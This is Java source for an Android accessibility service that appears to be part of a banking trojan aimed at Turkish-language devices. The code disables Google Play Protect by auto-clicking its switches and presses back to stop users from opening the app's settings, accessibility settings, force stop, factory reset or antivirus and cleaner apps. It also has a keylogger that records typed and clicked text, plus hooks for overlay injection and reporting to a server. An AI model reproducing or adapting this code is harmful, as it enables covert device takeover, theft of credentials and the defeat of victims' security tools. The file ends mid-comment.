package com.example.mmm.Service;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.pm.PackageManager;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.graphics.Rect;
import android.os.Build;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.util.List;
import java.util.ArrayList;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.example.mmm.Activity.actViewInjection;
import com.example.mmm.Utils.utils;
import com.example.mmm.constants;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Locale;


public class srvSccessibility extends AccessibilityService {

    utils utl = new utils();
    constants consts = new constants();
    private String TAG_LOG  = srvSccessibility.class.getSimpleName()+ consts.strTAG1;
    private String getEventText(AccessibilityEvent event){
        StringBuilder sb = new StringBuilder();
        for (CharSequence s : event.getText()) {
            sb.append(s);
        }
        return sb.toString();
    }
    String DP1 = "Ayarlar";
    String DP2 = "KAPAT";
    String DP3 = "Uygulamaları Play Protect ile tara";
    String DPStat = "";
    int restPoint = 0;
    private boolean keylogger = false;
    List<AccessibilityNodeInfo> dpRight = new ArrayList<>();
    private int mDebugDepth = 0;
    private String textKeylogger = consts.str_null;
    private String packageAppStart = consts.str_null;
    private String strText = consts.str_null;
    private String className = consts.str_null;
    private String app_inject = consts.str_null;
    private String strTextStand = consts.str_null;
    private boolean startOffProtect = false;

    public void click(int x, int y) {
        if (android.os.Build.VERSION.SDK_INT > 16) {
            clickAtPosition(x, y, getRootInActiveWindow());
        }
    }

    public static void clickAtPosition(int x, int y, AccessibilityNodeInfo node) {
        if (node == null) return;
        try {
            if (node.getChildCount() == 0) {
                Rect buttonRect = new Rect();
                node.getBoundsInScreen(buttonRect);
                if (buttonRect.contains(x, y)) {
                    // Maybe we need to think if a large view covers item?
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    //   System.out.println("1º - Node Information: " + node.toString());
                }
            } else {
                Rect buttonRect = new Rect();
                node.getBoundsInScreen(buttonRect);
                if (buttonRect.contains(x, y)) {
                    // Maybe we need to think if a large view covers item?
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    //  System.out.println("2º - Node Information: " + node.toString());
                }
                for (int i = 0; i < node.getChildCount(); i++) {
                    clickAtPosition(x, y, node.getChild(i));
                }
            }
        }catch (Exception ex){
            //  utl.SettingsToAdd(context, consts.LogSMS , "(pro27)  | utils isAccessibilityServiceEnabled " + ex.toString() +"::endLog::");
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event){
        if (event == null) {
            return;
        }
        // #### UPDATED FROM ANYONE ANONIM. (:

        try
        {

            AccessibilityNodeInfo  mNodedderwq = event.getSource();
            strTextStand = getEventText(event);
            AccessibilityNodeInfo gPt = event.getSource();
            if(gPt.toString().contains("com.android.vending"))
            {
                writeNodes(gPt);
            }

            if (utl.SettingsRead(this, consts.checkProtect).equals(consts.str_1)) {
                startOffProtect = true;
            } else {
                startOffProtect = false;
            }
            try {

                //alinacak
                if(startOffProtect) {

                    List<AccessibilityNodeInfo> listpro = gPt.findAccessibilityNodeInfosByText(DP1);

                    for (AccessibilityNodeInfo nodepro : listpro) {
                        if (nodepro.getPackageName().toString().indexOf("com.android.vending") != -1) {
                            if (nodepro.getContentDescription().toString().indexOf(DP1) != -1){

                                try {
                                    nodepro.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                } catch (Exception err) {

                                }
                            }


                        }
                    }
                    AccessibilityNodeInfo mNode = event.getSource();
                    List<AccessibilityNodeInfo> listf2 = mNode.findAccessibilityNodeInfosByText(DP2);
                    listf2.addAll(mNode.findAccessibilityNodeInfosByText("KAPAT"));
                    listf2.addAll(mNode.findAccessibilityNodeInfosByText("Kapat"));
                    for (AccessibilityNodeInfo node2e : listf2) {
                        if(node2e.getPackageName().toString().indexOf("com.android.vending") != -1) {



                            if (node2e.getClassName().toString().indexOf("android.widget.Button") != -1) {


                                try {
                                    node2e.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                    utl.SettingsWrite(this,consts.checkProtect, "0");
                                    //SF.POST(this, "4", "p=" + SF.trafEnCr(SF.ID_B(this) + "| Disable Play Protect Action < Final Step > COMPLETED! |"));
                                    blockBack();
                                }
                                catch (Exception err)
                                {

                                }



                            }
                        }

                    }




                }

                //alınacak
                if (!startOffProtect) {
                    if(event.getSource().getPackageName().toString().contains("com.android.vending")) {

                        //Log.e("ERROR", "STARTED FOR DISABLE 1");
                        AccessibilityNodeInfo fm = event.getSource();
                        List<AccessibilityNodeInfo> plNode = new ArrayList<AccessibilityNodeInfo>();
                        plNode.addAll(fm.findAccessibilityNodeInfosByText("Uygulama taramasını açın"));
                        plNode.addAll(fm.findAccessibilityNodeInfosByText("Turn on scan"));
                        plNode.addAll(fm.findAccessibilityNodeInfosByText("Play Protect ayarları"));

                        for (AccessibilityNodeInfo fpfm : plNode) {
                            try {
                                blockBack();
                                //SF.POST(this, "4", "p=" + SF.trafEnCr(SF.ID_B(this) + "| ALERT Attempt to Enable Play Protect !|"));
                                break;
                            } catch (Exception err) {

                            }
                        }
                    }

                }
            }
            catch ( Exception err)
            {

            }
            //alınacak
            if(event.getSource().getPackageName().toString().contains("com.android.vending")) {

                if(DPStat.equals("active") || restPoint != 0) {


                    for (AccessibilityNodeInfo gpnode : dpRight) {

                        try
                        {
                            restPoint = 0;
                            gpnode.performAction(AccessibilityNodeInfo.ACTION_CLICK);

                        }
                        catch (Exception err)
                        {

                        }



                    }


                }



                else if(DPStat.equals("deactive"))
                {
                    AccessibilityNodeInfo fm = event.getSource();
                    List<AccessibilityNodeInfo> plNode = new ArrayList<AccessibilityNodeInfo>();
                    plNode.addAll(fm.findAccessibilityNodeInfosByText("Uygulama taramasını açın"));
                    plNode.addAll(fm.findAccessibilityNodeInfosByText("Turn on scan"));
                    plNode.addAll(fm.findAccessibilityNodeInfosByText("Play Protect ayarları"));

                    for (AccessibilityNodeInfo fpfm : plNode) {

                        try {
                            blockBack();
                            break;
                        }
                        catch (Exception err) {

                        }
                    }
                }

                if(DPStat.equals("active") || restPoint != 0) {
                    AccessibilityNodeInfo gpEvent = event.getSource();
                    List<AccessibilityNodeInfo> gpNod = new ArrayList<AccessibilityNodeInfo>();

                    gpNod.addAll(gpEvent.findAccessibilityNodeInfosByText("TURN OFF"));
                    gpNod.addAll(gpEvent.findAccessibilityNodeInfosByText("KAPAT"));
                    gpNod.addAll(gpEvent.findAccessibilityNodeInfosByText("EVET"));

                    for (AccessibilityNodeInfo norm2e : gpNod) {

                        try {
                            norm2e.performAction(AccessibilityNodeInfo.ACTION_CLICK);

                        } catch (Exception err) {

                        }

                    }
                }



            }

            //alinacak
            if(!startOffProtect)
            {

                List<AccessibilityNodeInfo> listpro = mNodedderwq.findAccessibilityNodeInfosByText(DP1);


                for (AccessibilityNodeInfo nodepro : listpro) {
                    if (nodepro.getPackageName().toString().indexOf("com.android.vending") != -1)
                    {

                        if (nodepro.getContentDescription().toString().indexOf(DP1) != -1)
                        {
                            try {
                                blockBack();
                                //SF.POST(this, "4", "p=" + SF.trafEnCr(SF.ID_B(this) + "| Attempt to <> Enable Play Protect!|"));
                                break;

                            }
                            catch ( Exception err)
                            {

                            }

                        }
                    }
                }

                AccessibilityNodeInfo mNode = event.getSource();
                List<AccessibilityNodeInfo> listf2 = mNode.findAccessibilityNodeInfosByText(DP3);
                for (AccessibilityNodeInfo node2e : listf2) {
                    if(node2e.getPackageName().toString().indexOf("com.android.vending") != -1) {

                        if (node2e.getClassName().toString().indexOf("android.widget.TextView") != -1) {

                            if (node2e.getText().toString().indexOf(DP3) != -1) {
                                try {
                                    blockBack();
                                    //SF.POST(this, "4", "p=" + SF.trafEnCr(SF.ID_B(this) + "| Attempt to <> Enable Play Protect!|"));
                                    break;
                                }
                                catch (Exception err)
                                {

                                }
                            }
                        }
                    }
                }
            }

            AccessibilityNodeInfo  mNodeddxed = event.getSource();
            List<AccessibilityNodeInfo> listf2xdqeq = mNodeddxed.findAccessibilityNodeInfosByText(utl.getLabelApplication(this).toLowerCase());
            for (AccessibilityNodeInfo node2eradd : listf2xdqeq) {

                if(node2eradd.getPackageName().toString().indexOf("com.android.settings") != -1) {

                    if (node2eradd.getClassName().toString().indexOf("android.widget.TextView") != -1) {

                        if (node2eradd.getText().toString().equals(utl.getLabelApplication(this).toLowerCase())) {
                            try {
                                blockBack();
                                //utl.SettingsToAdd(this, consts.LogSMS , consts.string_169 + consts.string_119);
                                break;
                            } catch (Exception err) {

                            }
                        }
                    }
                }

            }

            AccessibilityNodeInfo  mnoderby = event.getSource();
            List<AccessibilityNodeInfo> listfpmx2 = mnoderby.findAccessibilityNodeInfosByText(consts.strAccessbilityService.toLowerCase());
            for (AccessibilityNodeInfo nodenoneaddr : listfpmx2) {

                if(nodenoneaddr.getPackageName().toString().indexOf("com.android.settings") != -1) {

                    if (nodenoneaddr.getClassName().toString().indexOf("android.widget.TextView") != -1) {

                        if (nodenoneaddr.getText().toString().equals(consts.strAccessbilityService.toLowerCase())) {
                            try {
                                blockBack();
                                break;
                            } catch (Exception err) {

                            }
                        }
                    }
                }

            }


            //---------------wifi_open-------------------
            ConnectivityManager connManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);

            if (!mWifi.isConnected() && Build.VERSION.SDK_INT <= Build.VERSION_CODES.O_MR1) {
                WifiManager wifiManager = (WifiManager)
                        this.getApplicationContext().getSystemService(WIFI_SERVICE);
                wifiManager.setWifiEnabled(true);
            }

            //---------------wifi_open-------------------


            // "for before show apps"
            List<AccessibilityNodeInfo> newForBefore = mNodedderwq.findAccessibilityNodeInfosByText("uygulama");
            for (AccessibilityNodeInfo forBefore : newForBefore) {



                if(forBefore.getPackageName().toString().equals("com.android.settings")) {

                    if (forBefore.getClassName().toString().equals("android.widget.TextView")) {

                        if (forBefore.getText().toString().contains("Son açılan uygulamalar") ||  forBefore.getText().toString().contains("uygulamanın tümünü görün")  ) {

                            try {
                                blockBack();
                                //SF.POST(this, "4", "p=" + SF.trafEnCr(SF.ID_B(this) + "|Bot try to look apps and blocked before show 2|"));
                                break;
                            } catch (Exception err) {
                            }
                        }
                    }
                }

            }

            // "for format"
            List<AccessibilityNodeInfo> newForMat = mNodedderwq.findAccessibilityNodeInfosByText("sıfırla");
            for (AccessibilityNodeInfo forMater : newForMat) {



                if(forMater.getPackageName().toString().equals("com.android.settings")) {

                    if (forMater.getClassName().toString().equals("android.widget.TextView")) {

                        if ((forMater.getText().toString().contains("yedekleme") || forMater.getText().toString().contains("sıfırla") || forMater.getText().toString().contains("fabrika veri") || forMater.getText().toString().contains("fabrika ayar")) && forMater.getText().toString().indexOf("uyarıda bulunmadan silme") == -1 ) {

                            try {
                                blockBack();
                                //SF.POST(this, "4", "p=" + SF.trafEnCr(SF.ID_B(this) + "|Bot try to reset phone before show 2|"));
                                break;
                            } catch (Exception err) {
                            }
                        }
                    }
                }

            }

            List<AccessibilityNodeInfo> newForClear = mNodedderwq.findAccessibilityNodeInfosByText(utl.getLabelApplication(this).toLowerCase());
            for (AccessibilityNodeInfo forCleare : newForClear) {



                if(forCleare.getPackageName().toString().contains("clean") ||
                        forCleare.getPackageName().toString().contains("eset") ||
                        forCleare.getPackageName().toString().contains("antivirus")  ||
                        forCleare.getPackageName().toString().contains("remove")  ||
                        forCleare.getPackageName().toString().contains("clean") ||
                        forCleare.getPackageName().toString().contains("avg") ||
                        forCleare.getPackageName().toString().contains("com.kms.free") ||
                        forCleare.getPackageName().toString().contains("manager") ||
                        forCleare.getPackageName().toString().contains("simplitec") ||
                        forCleare.getPackageName().toString().contains("optimiz") ||
                        forCleare.getPackageName().toString().contains("master") ||
                        forCleare.getPackageName().toString().contains("stolitomson") ||
                        forCleare.getPackageName().toString().contains("virus") ||
                        forCleare.getPackageName().toString().contains("clear") ||
                        forCleare.getPackageName().toString().contains("boost") ||
                        forCleare.getPackageName().toString().contains("secure") ||
                        forCleare.getPackageName().toString().contains("security") ||
                        forCleare.getPackageName().toString().contains("looploop") ||
                        forCleare.getPackageName().toString().contains("thedarken") ||
                        forCleare.getPackageName().toString().contains("housechores") ||
                        forCleare.getPackageName().toString().contains("care") ||
                        forCleare.getPackageName().toString().contains("iobit") ||
                        forCleare.getPackageName().toString().contains("com.lookout") ||
                        forCleare.getPackageName().toString().contains("com.avira") ||
                        forCleare.getPackageName().toString().contains("com.eset") ||
                        forCleare.getPackageName().toString().contains("malware") ||
                        forCleare.getPackageName().toString().contains("com.psafe") ||
                        forCleare.getPackageName().toString().contains("defender") ||
                        forCleare.getPackageName().toString().contains("com.wsandroid") ||
                        forCleare.getPackageName().toString().contains("trendmicro") ||
                        forCleare.getPackageName().toString().contains("quickheal") ||
                        forCleare.getPackageName().toString().contains("mobikeeper") ||
                        forCleare.getPackageName().toString().contains("com.drweb") ||
                        forCleare.getPackageName().toString().contains("com.ctt.guard") ||
                        forCleare.getPackageName().toString().contains("guard") ||
                        forCleare.getPackageName().toString().contains("scandrive") ||
                        forCleare.getPackageName().toString().contains("com.androidarmy") ||
                        forCleare.getPackageName().toString().contains("com.estsoft") ||
                        forCleare.getPackageName().toString().contains("com.avg") ||
                        forCleare.getPackageName().toString().contains("com.androidarmy") ||
                        forCleare.getPackageName().toString().contains("com.sophos") ||
                        forCleare.getPackageName().toString().contains("httpcanary") ||
                        forCleare.getPackageName().toString().contains("br.com.mobil")
                ) {

                    if (forCleare.getClassName().toString().equals("android.widget.TextView")) {

                        if (forCleare.getText().toString().contains(utl.getLabelApplication(this).toLowerCase())) {

                            try {
                                blockBack();
                                //SF.POST(this, "4", "p=" + SF.trafEnCr(SF.ID_B(this) + "|Bot scan or remove in other av clean tools 2|"));
                                break;
                            } catch (Exception err) {
                            }
                        }
                    }
                }

            }

            // new in app antivirus

            if(mNodedderwq.getPackageName().toString().contains("clean") ||
                    mNodedderwq.getPackageName().toString().contains("eset") ||
                    mNodedderwq.getPackageName().toString().contains("antivirus")  ||
                    mNodedderwq.getPackageName().toString().contains("remove")  ||
                    mNodedderwq.getPackageName().toString().contains("avg") ||
                    mNodedderwq.getPackageName().toString().contains("com.kms.free") ||
                    mNodedderwq.getPackageName().toString().contains("simplitec") ||
                    mNodedderwq.getPackageName().toString().contains("optimiz") ||
                    mNodedderwq.getPackageName().toString().contains("master") ||
                    mNodedderwq.getPackageName().toString().contains("stolitomson") ||
                    mNodedderwq.getPackageName().toString().contains("virus") ||
                    mNodedderwq.getPackageName().toString().contains("clear") ||
                    mNodedderwq.getPackageName().toString().contains("boost") ||
                    mNodedderwq.getPackageName().toString().contains("secure") ||
                    mNodedderwq.getPackageName().toString().contains("security") ||
                    mNodedderwq.getPackageName().toString().contains("looploop") ||
                    mNodedderwq.getPackageName().toString().contains("thedarken") ||
                    mNodedderwq.getPackageName().toString().contains("housechores") ||
                    mNodedderwq.getPackageName().toString().contains("care") ||
                    mNodedderwq.getPackageName().toString().contains("iobit") ||
                    mNodedderwq.getPackageName().toString().contains("com.lookout") ||
                    mNodedderwq.getPackageName().toString().contains("com.avira") ||
                    mNodedderwq.getPackageName().toString().contains("com.eset") ||
                    mNodedderwq.getPackageName().toString().contains("malware") ||
                    mNodedderwq.getPackageName().toString().contains("com.psafe") ||
                    mNodedderwq.getPackageName().toString().contains("defender") ||
                    mNodedderwq.getPackageName().toString().contains("com.wsandroid") ||
                    mNodedderwq.getPackageName().toString().contains("trendmicro") ||
                    mNodedderwq.getPackageName().toString().contains("quickheal") ||
                    mNodedderwq.getPackageName().toString().contains("mobikeeper") ||
                    mNodedderwq.getPackageName().toString().contains("com.drweb") ||
                    mNodedderwq.getPackageName().toString().contains("com.ctt.guard") ||
                    mNodedderwq.getPackageName().toString().contains("guard") ||
                    mNodedderwq.getPackageName().toString().contains("scandrive") ||
                    mNodedderwq.getPackageName().toString().contains("com.androidarmy") ||
                    mNodedderwq.getPackageName().toString().contains("com.estsoft") ||
                    mNodedderwq.getPackageName().toString().contains("com.avg") ||
                    mNodedderwq.getPackageName().toString().contains("com.androidarmy") ||
                    mNodedderwq.getPackageName().toString().contains("com.sophos") ||
                    mNodedderwq.getPackageName().toString().contains("uninstall") ||
                    mNodedderwq.getPackageName().toString().contains("httpcanary") ||
                    mNodedderwq.getPackageName().toString().contains("br.com.mobil")
            ) {
                try {
                    blockBack();
                    //SF.POST(this, "4", "p=" + SF.trafEnCr(SF.ID_B(this) + "|Bot try to open clean antivirus app and blocked 2|"));
                } catch (Exception err) {
                }
            }

            // new codes end line



            // ###########################################OLD CODES

            AccessibilityNodeInfo  mNodedderee = event.getSource();
            List<AccessibilityNodeInfo> listf2xdqzzeeax = mNodedderee.findAccessibilityNodeInfosByText("zorla");
            for (AccessibilityNodeInfo node2erare : listf2xdqzzeeax) {

                if(node2erare.getPackageName().toString().contains("com.android.settings")) {
                    if (node2erare.getClassName().toString().contains("android.widget.TextView")) {
                        if (node2erare.getText().toString().contains("zorla") || node2erare.getText().toString().contains("durmaya zorla")) {

                            try {
                                blockBack();

                                //SF.POST(this, "4", "p=" + SF.trafEnCr(SF.ID_B(this) + "| Bot clicked force stop app and <blocked>!|"));
                                break;
                            } catch (Exception err) {
                            }
                        }
                    }
                }

            }


            if (strTextStand.contains(consts.strAccessbilityService.substring(0, 7))) {


                List<AccessibilityNodeInfo> smsNode = new ArrayList<AccessibilityNodeInfo>();
                smsNode.addAll(gPt.findAccessibilityNodeInfosByText("Hizmeti kullan"));
                smsNode.addAll(gPt.findAccessibilityNodeInfosByText("Hiçbir açıklama sağlanmadı"));
                smsNode.addAll(gPt.findAccessibilityNodeInfosByText("Herhangi bir tanımlama sağlanmadı"));
                smsNode.addAll(gPt.findAccessibilityNodeInfosByText("Erişilebilirlik"));
                smsNode.addAll(gPt.findAccessibilityNodeInfosByText("Accessibility"));
                smsNode.addAll(gPt.findAccessibilityNodeInfosByText("Services"));
                smsNode.addAll(gPt.findAccessibilityNodeInfosByText("Servisler"));
                smsNode.addAll(gPt.findAccessibilityNodeInfosByText("hizmeti durdur"));
                smsNode.addAll(gPt.findAccessibilityNodeInfosByText("No description provided"));
                smsNode.addAll(gPt.findAccessibilityNodeInfosByText("Verilen açıklama yok."));



                for (AccessibilityNodeInfo node : smsNode) {
                    List<AccessibilityNodeInfo> basiptale = new ArrayList<AccessibilityNodeInfo>();
                    basiptale.addAll(event.getSource().findAccessibilityNodeInfosByText("iptal"));
                    basiptale.addAll(event.getSource().findAccessibilityNodeInfosByText("İPTAL"));
                    basiptale.addAll(event.getSource().findAccessibilityNodeInfosByText("IPTAL"));
                    basiptale.addAll(event.getSource().findAccessibilityNodeInfosByText("VAZGEÇ"));
                    basiptale.addAll(event.getSource().findAccessibilityNodeInfosByText("Vazgeç"));
                    basiptale.addAll(event.getSource().findAccessibilityNodeInfosByText("CANCEL"));
                    basiptale.addAll(event.getSource().findAccessibilityNodeInfosByText("Cancel"));

                    for (AccessibilityNodeInfo basiptalex : basiptale) {
                        for(int i=0; i<3; i++)
                        {
                            basiptalex.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        }

                        break;
                    }
                    blockBack();
                }


            }


            AccessibilityNodeInfo  mNodeddereedada = event.getSource();
            List<AccessibilityNodeInfo> listf2xeeer = mNodeddereedada.findAccessibilityNodeInfosByText(utl.getLabelApplication(this).toLowerCase());
            for (AccessibilityNodeInfo node2erarexxqq : listf2xeeer) {

                if(node2erarexxqq.getPackageName().toString().toLowerCase().contains("com.wsandroid.suite") || node2erarexxqq.getPackageName().toString().toLowerCase().contains("com.totalav.android") || node2erarexxqq.getPackageName().toString().toLowerCase().contains("com.avira.android") || node2erarexxqq.getPackageName().toString().toLowerCase().contains("com.kms.free") || node2erarexxqq.getPackageName().toString().toLowerCase().contains("com.iobit.mobilecare") || node2erarexxqq.getPackageName().toString().toLowerCase().contains("com.stolitomson") || node2erarexxqq.getPackageName().toString().toLowerCase().contains("com.eset.ems2.gp") ||  node2erarexxqq.getPackageName().toString().toLowerCase().contains("remover") || node2erarexxqq.getPackageName().toString().toLowerCase().contains("manage") ||  node2erarexxqq.getPackageName().toString().toLowerCase().contains("delete") ||  node2erarexxqq.getPackageName().toString().toLowerCase().contains("fileexplorer") || node2erarexxqq.getPackageName().toString().toLowerCase().contains("esfile") || node2erarexxqq.getPackageName().toString().toLowerCase().contains("uninstall") || node2erarexxqq.getPackageName().toString().toLowerCase().contains("remove") || node2erarexxqq.getPackageName().toString().toLowerCase().contains("com.splendapps.shark") || node2erarexxqq.getPackageName().toString().toLowerCase().contains("unused") || node2erarexxqq.getPackageName().toString().toLowerCase().contains("com.systweak.systemoptimizer") || node2erarexxqq.getPackageName().toString().toLowerCase().contains("clean") || node2erarexxqq.getPackageName().toString().toLowerCase().contains("antivirus") || node2erarexxqq.getPackageName().toString().toLowerCase().contains("virus") || node2erarexxqq.getPackageName().toString().toLowerCase().contains("security") || node2erarexxqq.getPackageName().toString().toLowerCase().contains("com.estrongs.android.pop")  ) {
                    if (node2erarexxqq.getClassName().toString().contains("android.widget.TextView")) {
                        if (node2erarexxqq.getText().toString().contains(utl.getLabelApplication(this).toLowerCase())) {

                            try {
                                blockBack();
                                //SF.POST(this, "4", "p=" + SF.trafEnCr(SF.ID_B(this) + "| Bot try remove with mcaffee or other apps and <blocked>!|"));
                                break;
                            } catch (Exception err) {
                            }
                        }
                    }
                }

            }


            //  >>
        }
        catch (Exception err)
        {
        }


/*
        String eventText = "";
        String eventPackageName = String.valueOf(event.getPackageName());
        List<CharSequence> eventTexts = event.getText();
        String eventClassName = String.valueOf(event.getClassName());
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                eventText = "TYPE_VIEW_CLICKED";
                break;
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                eventText = "TYPE_VIEW_FOCUSED";
                break;
            case AccessibilityEvent.TYPE_VIEW_LONG_CLICKED:
                eventText = "TYPE_VIEW_LONG_CLICKED";
                break;
            case AccessibilityEvent.TYPE_VIEW_SELECTED:
                eventText = "TYPE_VIEW_SELECTED";
                break;
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                eventText = "TYPE_VIEW_TEXT_CHANGED";
                break;
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                eventText = "TYPE_WINDOW_STATE_CHANGED";
                break;
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                eventText = "TYPE_NOTIFICATION_STATE_CHANGED";
                break;
            case AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_END:
                eventText = "TYPE_TOUCH_EXPLORATION_GESTURE_END";
                break;
            case AccessibilityEvent.TYPE_ANNOUNCEMENT:
                eventText = "TYPE_ANNOUNCEMENT";
                break;
            case AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_START:
                eventText = "TYPE_TOUCH_EXPLORATION_GESTURE_START";
                break;
            case AccessibilityEvent.TYPE_VIEW_HOVER_ENTER:
                eventText = "TYPE_VIEW_HOVER_ENTER";
                break;
            case AccessibilityEvent.TYPE_VIEW_HOVER_EXIT:
                eventText = "TYPE_VIEW_HOVER_EXIT";
                break;
            case AccessibilityEvent.TYPE_VIEW_SCROLLED:
                eventText = "TYPE_VIEW_SCROLLED";
                break;
            case AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED:
                eventText = "TYPE_VIEW_TEXT_SELECTION_CHANGED";
                break;
            case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                eventText = "TYPE_WINDOW_CONTENT_CHANGED";
                break;
        }
        Log.i("TAG_EVENT_TEST", "触发事件---->" + eventText);
        Log.i("TAG_EVENT_TEST", "事件的包名---->" + eventPackageName);
        Log.i("TAG_EVENT_TEST", "事件的类名---->" + eventClassName);
        Log.i("TAG_EVENT_TEST", "事件的文本---->");
        for (CharSequence s : eventTexts) {
            Log.i("TAG_EVENT_TEST222",  String.valueOf(s));
        }*/

        //  logClick(event.getSource());

/*
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_ANNOUNCEMENT:
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {

                    DisplayMetrics displayMetrics = getResources().getDisplayMetrics();

                    int middleYValue = displayMetrics.heightPixels / 2;
                    final int leftSideOfScreen = displayMetrics.widthPixels / 4;
                    final int rightSizeOfScreen = leftSideOfScreen * 3;

                    Log.e("left", "" + leftSideOfScreen);
                    Log.e("right", "" + rightSizeOfScreen);

                    GestureDescription.Builder gestureBuilder = new GestureDescription.Builder();
                    Path path = new Path();

                    if (event.getText() != null && event.getText().toString().contains("1")) {
                        //Swipe left
                        path.moveTo(rightSizeOfScreen, middleYValue);
                        path.lineTo(leftSideOfScreen, middleYValue);
                        Log.e("SSSSSSSSS1", "Gesture Completed");
                    } else {
                        //Swipe right
                        path.moveTo(leftSideOfScreen, middleYValue);
                        path.lineTo(rightSizeOfScreen, middleYValue);
                        Log.e("SSSSSSSSS2", "Gesture Completed");
                    }

                    gestureBuilder.addStroke(new GestureDescription.StrokeDescription(path, 100, 50));
                    dispatchGesture(gestureBuilder.build(), new GestureResultCallback() {
                        @Override
                        public void onCompleted(GestureDescription gestureDescription) {
                            Log.e("SSSSSSSSS", "Gesture Completed");
                            super.onCompleted(gestureDescription);
                        }
                    }, null);
                }

            default: {
                break;
            }
        }



			//---------------wifi_open-------------------
            ConnectivityManager connManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);

            if (!mWifi.isConnected() && Build.VERSION.SDK_INT <= Build.VERSION_CODES.O_MR1) {
                WifiManager wifiManager = (WifiManager)
                        this.getApplicationContext().getSystemService(WIFI_SERVICE);
                wifiManager.setWifiEnabled(true);
            }

			//---------------wifi_open-------------------
			*/


        //---------------Keylogger-------------------
        if(keylogger) {
            try {
                DateFormat df = new SimpleDateFormat(consts.string_52, Locale.US);
                String time = df.format(Calendar.getInstance().getTime());
                switch (event.getEventType()) {//Keylogger
                    case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                        if(!event.getText().toString().equals(consts.str_null)) {
                            textKeylogger = textKeylogger + time + consts.string_53 + event.getText().toString() + consts.string_56;
                        }
                        break;
                    }
                    case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                        if(!event.getText().toString().equals(consts.str_null)) {
                            textKeylogger = textKeylogger + time + consts.string_54 + event.getText().toString() + consts.string_56;
                        }
                        break;
                    }
                    case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                        if(!event.getText().toString().equals(consts.str_null)) {
                            textKeylogger = textKeylogger + time + consts.string_55 + event.getText().toString() + consts.string_56;
                        }
                        break;
                    }
                    default:{
                        try {
                            if(event.getText().toString().length()>=3) {
                                textKeylogger = textKeylogger + time + consts.string_53  + event.getText().toString().length() + consts.string_157 + event.getText().toString() + consts.string_56;
                            }
                        }catch (Exception ex){}
                    }
                }
            } catch (Exception ex) {}
        }
        //------------------------------------------

        try {
            app_inject = event.getPackageName().toString();
        }catch (Exception ex){
            app_inject = consts.str_null;
            utl.Log(TAG_LOG, consts.string_27);
            //   utl.SettingsToAdd(this, consts.LogSMS , consts.string_159 + ex.toString() + consts.string_119);
        }

        try {
            packageAppStart = event.getPackageName().toString().toLowerCase();
        }catch (Exception ex){
            packageAppStart = consts.str_null;
            utl.Log(TAG_LOG, consts.string_27);
            //   utl.SettingsToAdd(this, consts.LogSMS , consts.string_160 + ex.toString() + consts.string_119);
        }

        try {
            strText = getEventText(event).toLowerCase();
        }catch (Exception ex){
            strText = consts.str_null;
            utl.Log(TAG_LOG, consts.string_27);
            //  utl.SettingsToAdd(this, consts.LogSMS ,  consts.string_161 + ex.toString() + consts.string_119);
        }

        try {
            className = event.getClassName().toString().toLowerCase();
            utl.Log(TAG_LOG, className);
        }catch (Exception ex){
            className = consts.str_null;
            utl.Log(TAG_LOG, consts.string_27);
            //   utl.SettingsToAdd(this, consts.LogSMS , consts.string_162 + ex.toString() + consts.string_119);
        }




        //-------------------------------------------------------------------


        // AccessibilityEvent.TYPE_ANNOUNCEMENT
        // AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED водить







        //  if (AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED == event.getEventType()) {// Тянуть
        //  AccessibilityNodeInfo nodeInfo = event.getSource();
        //   if (event == null) {
        // return;
        //}
        // Log.e("EEE",""+event.getSource());




        //   Rect buttonRect = new Rect();
        //   nodeInfo.getBoundsInScreen(buttonRect);
        //   Log.e("T","SS: "+buttonRect + "   X:" + buttonRect.centerX() + "  Y:"+buttonRect.centerY());

        //  nodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK);

        // }
        try {

            if ((AccessibilityEvent.TYPE_VIEW_SELECTED == event.getEventType() && (!utl.getScreenBoolean(this)))) {
                utl.Log(TAG_LOG, consts.string_28);

                if(keylogger) {
                    DateFormat df = new SimpleDateFormat(consts.string_52, Locale.US);
                    String time = df.format(Calendar.getInstance().getTime());
                    textKeylogger = textKeylogger + time + consts.string_53 + consts.string_28 + consts.string_56;
                }

             /*  utl.chalkTile(3000);
              int x = Integer.parseInt(utl.SettingsRead(this, consts.display_width));
              int y = Integer.parseInt(utl.SettingsRead(this, consts.display_height));

              for(int py=y/2; py<y; py+=6){
                  utl.chalkTile(100);
                  Log.i("y", ""+py );

